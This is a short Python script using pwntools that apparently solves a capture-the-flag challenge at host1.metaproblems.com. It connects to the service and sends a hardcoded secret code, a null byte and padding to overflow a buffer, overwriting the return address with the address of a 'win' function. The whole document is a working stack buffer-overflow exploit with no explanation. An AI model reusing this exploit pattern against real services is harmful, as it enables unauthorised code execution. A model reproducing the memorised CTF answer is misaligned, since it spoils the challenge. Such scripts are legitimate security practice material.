from pwn import *

host = "host1.metaproblems.com" 
port = 5151
r = remote(host, port)

p = "Sup3rs3cr3tC0de"
pad = 60-len(p)-5
win = 0x401172

r.sendline(p+ "\x00" + pad*"A" + p64(win).decode()) # "\x72\x11\x40\x00"

print(r.recvall())